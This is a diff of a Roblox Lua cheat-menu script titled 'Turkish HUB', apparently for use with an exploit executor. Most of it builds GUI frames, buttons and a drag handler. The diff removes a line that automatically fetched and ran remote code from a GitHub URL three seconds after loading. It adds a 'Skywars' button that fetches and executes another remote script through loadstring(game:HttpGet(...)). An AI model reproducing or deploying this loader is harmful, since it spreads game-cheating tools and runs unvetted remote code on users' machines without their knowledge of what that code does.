@@ -3,101 +3,104 @@
 
 -- Instances:
 
-local fremacokonatl = Instance.new("ScreenGui")
-local hemde = Instance.new("Frame")
-local yupi = Instance.new("TextLabel")
-local TextLabel = Instance.new("TextLabel")
-local leblebi = Instance.new("TextLabel")
-local retr = Instance.new("TextLabel")
-local ImageLabel = Instance.new("ImageLabel")
+local screengu = Instance.new("ScreenGui")
+local bebe = Instance.new("Frame")
+local zaa = Instance.new("TextButton")
 local UICorner = Instance.new("UICorner")
+local UICorner_2 = Instance.new("UICorner")
+local culose = Instance.new("TextButton")
+local UICorner_3 = Instance.new("UICorner")
+local TextLabel = Instance.new("TextLabel")
+local UICorner_4 = Instance.new("UICorner")
 
 --Properties:
 
-fremacokonatl.Name = "fremacokonatlı"
-fremacokonatl.Parent = game.CoreGui
-fremacokonatl.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screengu.Name = "screenguııı"
+screengu.Parent = game.Workspace
+screengu.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
-hemde.Name = "hemde"
-hemde.Parent = fremacokonatl
-hemde.Active = true
-hemde.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
-hemde.BorderColor3 = Color3.fromRGB(34, 34, 34)
-hemde.Position = UDim2.new(0.208816722, 0, 0.28597784, 0)
-hemde.Size = UDim2.new(0, 411, 0, 248)
+bebe.Name = "bebe"
+bebe.Parent = screengu
+bebe.Active = true
+bebe.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
+bebe.Position = UDim2.new(-2.19799995, 0, 0.305999994, 0)
+bebe.Size = UDim2.new(0, 473, 0, 286)
 
-yupi.Name = "yupi"
-yupi.Parent = hemde
-yupi.BackgroundColor3 = Color3.fromRGB(54, 54, 54)
-yupi.BorderColor3 = Color3.fromRGB(54, 54, 54)
-yupi.Position = UDim2.new(0, 0, 0.935483873, 0)
-yupi.Size = UDim2.new(0, 15, 0, 16)
-yupi.Font = Enum.Font.SourceSans
-yupi.Text = ""
-yupi.TextColor3 = Color3.fromRGB(0, 0, 0)
-yupi.TextSize = 14.000
+zaa.Name = "zaa"
+zaa.Parent = bebe
+zaa.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+zaa.Position = UDim2.new(0.10359408, 0, 0.346153855, 0)
+zaa.Size = UDim2.new(0, 372, 0, 106)
+zaa.Font = Enum.Font.PatrickHand
+zaa.Text = "Skywars"
+zaa.TextColor3 = Color3.fromRGB(0, 0, 0)
+zaa.TextScaled = true
+zaa.TextSize = 14.000
+zaa.TextWrapped = true
+zaa.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/cihonemm/ez/main/e'))()
+end)
 
-TextLabel.Parent = hemde
-TextLabel.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
-TextLabel.BorderColor3 = Color3.fromRGB(34, 34, 34)
-TextLabel.Position = UDim2.new(0, 0, 0.830645144, 0)
-TextLabel.Size = UDim2.new(0, 411, 0, 26)
+UICorner.CornerRadius = UDim.new(0, 6)
+UICorner.Parent = zaa
+
+UICorner_2.CornerRadius = UDim.new(0, 3)
+UICorner_2.Parent = bebe
+
+culose.Name = "culose"
+culose.Parent = bebe
+culose.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
+culose.Position = UDim2.new(0.875264287, 0, 0, 0)
+culose.Size = UDim2.new(0, 59, 0, 45)
+culose.Font = Enum.Font.SourceSans
+culose.Text = "X"
+culose.TextColor3 = Color3.fromRGB(213, 213, 213)
+culose.TextScaled = true
+culose.TextSize = 14.000
+culose.TextWrapped = true
+
+UICorner_3.Parent = culose
+
+TextLabel.Parent = bebe
+TextLabel.Active = true
+TextLabel.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
+TextLabel.Size = UDim2.new(0, 414, 0, 45)
 TextLabel.Font = Enum.Font.SourceSans
-TextLabel.Text = ""
+TextLabel.Text = "Turkish HUB"
 TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextScaled = true
 TextLabel.TextSize = 14.000
+TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 0, 0)
+TextLabel.TextStrokeTransparency = 0.000
+TextLabel.TextWrapped = true
 
-leblebi.Name = "leblebi"
-leblebi.Parent = hemde
-leblebi.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
-leblebi.BorderColor3 = Color3.fromRGB(34, 34, 34)
-leblebi.Position = UDim2.new(0.418491483, 0, 0.0967741907, 0)
-leblebi.Size = UDim2.new(0, 195, 0, 68)
-leblebi.Font = Enum.Font.SourceSans
-leblebi.Text = "MERHABA"
-leblebi.TextColor3 = Color3.fromRGB(255, 255, 255)
-leblebi.TextSize = 28.000
-leblebi.TextWrapped = true
-
-retr.Name = "retr"
-retr.Parent = hemde
-retr.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
-retr.BorderColor3 = Color3.fromRGB(34, 34, 34)
-retr.Position = UDim2.new(0.372262776, 0, 0.383064508, 0)
-retr.Size = UDim2.new(0, 245, 0, 57)
-retr.Font = Enum.Font.SourceSans
-retr.Text = "Bu Script Turk Yapimidir Iyi Oyunlar"
-retr.TextColor3 = Color3.fromRGB(255, 255, 255)
-retr.TextSize = 28.000
-retr.TextWrapped = true
-
-ImageLabel.Parent = hemde
-ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ImageLabel.Position = UDim2.new(0.107055962, 0, 0.185483873, 0)
-ImageLabel.Size = UDim2.new(0, 100, 0, 100)
-ImageLabel.Image = "http://www.roblox.com/asset/?id=6753145358"
-
-UICorner.CornerRadius = UDim.new(99, 8)
-UICorner.Parent = ImageLabel
+UICorner_4.Parent = TextLabel
 
 -- Scripts:
 
-local function GPTTMW_fake_script() -- TextLabel.LocalScript 
-	local script = Instance.new('LocalScript', TextLabel)
+local function YCJCUBB_fake_script() -- zaa.LocalScript 
+	local script = Instance.new('LocalScript', zaa)
 
 	print("Hello world!")
 	
 end
-coroutine.wrap(GPTTMW_fake_script)()
-local function ELPEQ_fake_script() -- TextLabel.LocalScript 
-	local script = Instance.new('LocalScript', TextLabel)
+coroutine.wrap(YCJCUBB_fake_script)()
+local function LUVS_fake_script() -- zaa.LocalScript 
+	local script = Instance.new('LocalScript', zaa)
 
 	print("Hello world!")
 	
 end
-coroutine.wrap(ELPEQ_fake_script)()
-local function BPVNKNJ_fake_script() -- hemde.Make GUI Draggable 
-	local script = Instance.new('LocalScript', hemde)
+coroutine.wrap(LUVS_fake_script)()
+local function HSKJ_fake_script() -- culose.LocalScript 
+	local script = Instance.new('LocalScript', culose)
+
+	print("Hello world!")
+	
+end
+coroutine.wrap(HSKJ_fake_script)()
+local function NYXEEW_fake_script() -- bebe.Make GUI Draggable 
+	local script = Instance.new('LocalScript', bebe)
 
 	local UserInputService = game:GetService("UserInputService")
 	
@@ -139,13 +142,11 @@ local function BPVNKNJ_fake_script() -- hemde.Make GUI Draggable
 		end
 	end)
 end
-coroutine.wrap(BPVNKNJ_fake_script)()
-local function LBZNUMN_fake_script() -- fremacokonatl.LocalScript 
-	local script = Instance.new('LocalScript', fremacokonatl)
+coroutine.wrap(NYXEEW_fake_script)()
+local function FNIDK_fake_script() -- screengu.LocalScript 
+	local script = Instance.new('LocalScript', screengu)
 
 	print("Hello world!")
 	
 end
-wait(3)
-loadstring(game:HttpGet('https://raw.githubusercontent.com/cihonemm/ez/main/z'))()
-coroutine.wrap(LBZNUMN_fake_script)()
+coroutine.wrap(FNIDK_fake_script)()
